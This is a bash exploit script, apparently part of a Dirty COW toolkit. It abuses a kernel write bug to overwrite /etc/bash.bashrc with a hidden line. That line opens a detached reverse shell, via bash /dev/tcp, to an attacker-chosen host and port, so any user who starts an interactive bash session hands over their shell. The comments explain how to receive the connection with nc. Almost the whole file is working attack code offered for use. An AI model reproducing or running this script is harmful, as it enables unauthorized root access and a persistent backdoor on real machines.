#!/bin/bash
#
# Add a line to /etc/bash.bashrc that tries to open a reverse root shell at
# localhost:8080 every minute. A backup of the old file is stored in $HOME
# before modifying the file.
#
# The script takes either 0 or 2 parameters. If parameters are given, they are
# as follows:
#
#	$1: The server to connect to for the reverse shell (default: localhost)
#	$2: The port to connect to (default: 8080)
#
# Once the exploit completes, listen on the given server and port for incoming
# TCP connections. For example:
#
#	nc -lp 8080 localhost
#
# The server will then receive a shell connection for the next user that starts
# an interactive bash session.

. "$(dirname "$0")/common.sh"

if [ $# -eq 0 ]; then
	server=localhost
	port=8080
elif [ $# -eq 2 ]; then
	server="$1"
	port="$2"
else
	die "Invalid number of arguments: $#"
fi

# file to edit
target=/etc/bash.bashrc

# in the payload, note the trailing '#' to ignore any garbage from the old line.
# the payload looks complex, but in essence it just runs the following command
# silently in the background, detached from the terminal:
#
#	bash -i >&/dev/tcp/$server/$port 0>&1
#
# this opens a reverse shell over TCP at the given server and port. nohup and
# the trailing ampersand are to prevent the shell from closing when the bash
# process ends, and the command is wrapped in `bash -c` because /dev/tcp is
# a bashism.

payload="(nohup bash -c 'bash -i>&/dev/tcp/$server/$port 0>&1'>/dev/null 2>&1&) #"
payload_len=$(printf "$payload" | wc -c)

if [ ! -r $target ]; then
	die "$target does not exist or is not readable."
elif [ "$(wc -c <$target)" -lt "$payload_len" ]; then
	die "$target is not large enough to insert payload."
fi

backup $target "$HOME/$(basename $target)"
dirtycow -s "$payload" $target
